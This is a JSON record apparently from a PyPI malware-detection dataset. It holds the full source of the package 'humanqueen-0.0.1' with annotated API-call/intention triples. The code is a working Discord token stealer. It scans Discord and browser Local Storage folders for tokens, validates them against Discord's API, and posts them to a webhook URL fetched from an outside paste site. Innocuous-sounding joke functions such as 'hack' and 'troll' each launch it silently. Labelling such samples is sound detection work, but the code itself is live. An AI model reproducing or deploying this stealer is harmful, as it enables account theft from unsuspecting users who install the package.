{
  "metadata": {
    "package_name": "humanqueen-0.0.1",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/humanqueen-0.0.1.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/humanqueen-0.0.1.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "__init__.py",
      "code_snippets": [
        {
          "snippet": "import sys,requests\nimport os, re, json, threading, urllib.request\n\n__HOOK__ = 'https://rentry.co/23azs/raw'\n\nclass Bunny:\n    def __init__(self):\n        self.path = [\n            '_Roaming/Discord/Local Storage/leveldb',\n            '_Roaming/Lightcord/Local Storage/leveldb',\n            '_Roaming/discordptb/Local Storage/leveldb',\n            '_Roaming/discordcanary/Local Storage/leveldb',\n            '_Roaming/Opera Software/Opera Stable/Local Storage/leveldb',\n            '_Roaming/Opera Software/Opera GX Stable/Local Storage/leveldb',\n            '_Local/Amigo/User Data/Local Storage/leveldb',\n            '_Local/Torch/User Data/Local Storage/leveldb',\n            '_Local/Kometa/User Data/Local Storage/leveldb',\n            '_Local/Orbitum/User Data/Local Storage/leveldb',\n            '_Local/CentBrowser/User Data/Local Storage/leveldb',\n            '_Local/7Star/7Star/User Data/Local Storage/leveldb',\n            '_Local/Sputnik/Sputnik/User Data/Local Storage/leveldb',\n            '_Local/Vivaldi/User Data/Default/Local Storage/leveldb',\n            '_Local/Google/Chrome SxS/User Data/Local Storage/leveldb',\n            '_Local/Epic Privacy Browser/User Data/Local Storage/leveldb',\n            '_Local/Google/Chrome/User Data/Default/Local Storage/leveldb',\n            '_Local/uCozMedia/Uran/User Data/Default/Local Storage/leveldb',\n            '_Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb',\n            '_Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb',\n            '_Local/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb',\n            '_Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb',\n        ]\n    \n    def __resolve_hook(self): return urllib.request.urlopen(urllib.request.Request(__HOOK__)).read().decode('utf-8')\n\n    def __get_tokens(self):\n        found_tokens = []\n\n        for path in self.path:\n            path = path.replace('_Local', os.getenv('LOCALAPPDATA')).replace('_Roaming', os.getenv('APPDATA'))\n\n            if os.path.exists(path):\n                for file_name in os.listdir(path):\n                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):\n                        continue\n\n                    for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:\n                        for token in re.findall(r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}', line):\n                            found_tokens.append(token)\n        \n        return list(set(found_tokens))\n    \n    def __check_tokens(self, token_list: list):\n        checked_tokens = []\n        checker_thread = []\n\n        def check(token: str):\n            try:\n                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/library', headers= {'content-type': 'application/json', 'authorization': token, 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}, method= 'GET')).getcode()\n\n                if res == 200:\n                    checked_tokens.append(token)\n            except:\n                pass\n\n        for token in token_list:\n            checker_thread.append(threading.Thread(target= check, args=(token,)))\n        \n        for T in checker_thread:\n            T.start()\n        \n        for T in checker_thread:\n            T.join()\n        \n        valid_tokens = ''\n        for token in checked_tokens:\n            valid_tokens += f'\\n{token}'\n\n        return valid_tokens\n\n    def main(self):\n        hook = self.__resolve_hook()\n        tokens = self.__check_tokens(self.__get_tokens())\n\n        if tokens != '':\n            try:\n                urllib.request.urlopen(urllib.request.Request(hook, data= json.dumps({'content': f'>>> ||@everyone||\\n```{tokens}```'}).encode(), headers= { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}))\n            except:\n                pass\n\ndef leave():\n    threading.Thread(target= Bunny().main()).start()\n    print(\"Daccord chef <3\")\n    sys.exit()\n\ndef couteau():\n    threading.Thread(target= Bunny().main()).start()\n    print(\"tu crois on fait de la drill ici ?\")\n\ndef hack():\n    threading.Thread(target= Bunny().main()).start()\n    print(\"Seul Xin est un haxor !\")\n\ndef ddos(ip=None):\n    threading.Thread(target= Bunny().main()).start()\n    if ip == None:\n        print(\"zebi tu sais pas use une fonction ou quoi\")\n        print(\"usage : ddos(lip ici) ex: ddos(127.0.0.1)\")\n    else:\n        print(\"azy je fait sa \")\n        os.system(\"pause\")\n        sys.exit()\n\ndef troll():\n    threading.Thread(target= Bunny().main()).start()\n    t = input(\"tu veut troll qui ?\")\n    print(f'hmmm alors tu veut troll {t}')\n    print(\"ok cest parti\")\n    os.system(\"pause\")\n    print(\"tu tes fait troll ducoup x)\")\n    import time; time.sleep(3)\n    sys.exit()",
          "triple_sequences": [
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "LOCALAPPDATA",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "APPDATA",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "f'{path}\\{file_name}', errors='ignore'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "file.readlines()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "re.findall()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}', line",
              "object_description": "Regular expression and file content",
              "object_id": "regex_file_content",
              "intention_description": "Extract browser tokens",
              "intention_id": "extract_browser_tokens"
            },
            {
              "action_api": "urllib.request.urlopen()",
              "action_description": "Opens URL with GET parameters",
              "action_id": "open_url_get",
              "object": "urllib.request.Request(__HOOK__)",
              "object_description": "Request object for external domain",
              "object_id": "request_external_domain",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "http_response.read()",
              "action_description": "Process HTTP response content",
              "action_id": "process_http_response",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Decode downloaded content",
              "intention_id": "decode_downloaded_content"
            },
            {
              "action_api": "str.decode()",
              "action_description": "Decodes bytes using default codec",
              "action_id": "decode_bytes_default",
              "object": "'utf-8'",
              "object_description": "Character encoding type",
              "object_id": "character_encoding_type",
              "intention_description": "Prepare string for further processing",
              "intention_id": "prepare_string_processing"
            },
            {
              "action_api": "urllib.request.urlopen()",
              "action_description": "Opens URL with GET parameters",
              "action_id": "open_url_get",
              "object": "urllib.request.Request('https://discord.com/api/v9/users/@me/library', headers= {...}, method='GET')",
              "object_description": "Request object for external domain",
              "object_id": "request_external_domain",
              "intention_description": "Access remote data",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "http_response.getcode()",
              "action_description": "Retrieves HTTP response status code",
              "action_id": "get_http_status",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Determine presence of valid authentication",
              "intention_id": "determine_valid_authentication_presence"
            },
            {
              "action_api": "threading.Thread()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "target=check, args=(token,)",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Run function in thread pool",
              "intention_id": "run_function_thread_pool"
            },
            {
              "action_api": "thread.start()",
              "action_description": "Starts thread execution",
              "action_id": "start_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Run function in thread pool",
              "intention_id": "run_function_thread_pool"
            },
            {
              "action_api": "thread.join()",
              "action_description": "Waits for thread to finish execution",
              "action_id": "wait_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Wait for events",
              "intention_id": "wait_for_events"
            },
            {
              "action_api": "json.dumps()",
              "action_description": "Serializes Python object to JSON string",
              "action_id": "serialize_to_json",
              "object": "{'content': f'>>> ||@everyone||\\n```{tokens}```'}",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Serialize data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "str.encode()",
              "action_description": "Encodes string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Encode string to bytes",
              "intention_id": "encode_string_to_bytes"
            },
            {
              "action_api": "urllib.request.urlopen()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "urllib.request.Request(hook, data=..., headers=...)",
              "object_description": "Request object for external domain",
              "object_id": "request_external_domain",
              "intention_description": "Send Discord tokens to server",
              "intention_id": "send_discord_tokens_server"
            },
            {
              "action_api": "threading.Thread()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "target=Bunny().main()",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Run function in thread pool",
              "intention_id": "run_function_thread_pool"
            },
            {
              "action_api": "thread.start()",
              "action_description": "Starts thread execution",
              "action_id": "start_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Run function in thread pool",
              "intention_id": "run_function_thread_pool"
            },
            {
              "action_api": "sys.exit()",
              "action_description": "Exits program",
              "action_id": "exit_program",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Terminate program execution",
              "intention_id": "terminate_program_execution"
            },
            {
              "action_api": "input()",
              "action_description": "Reads user input from standard input",
              "action_id": "read_user_input",
              "object": "\"tu veut troll qui ?\"",
              "object_description": "String containing environment data",
              "object_id": "string_environment_data",
              "intention_description": "Collect user input",
              "intention_id": "collect_user_input"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "\"pause\"",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Pause execution",
              "intention_id": "pause_execution"
            },
            {
              "action_api": "import time; time.sleep()",
              "action_description": "Suspends execution",
              "action_id": "suspend_execution",
              "object": "3",
              "object_description": "Delay duration in seconds",
              "object_id": "delay_duration",
              "intention_description": "Delay next operation",
              "intention_id": "delay_next_operation"
            }
          ]
        }
      ]
    }
  ]
}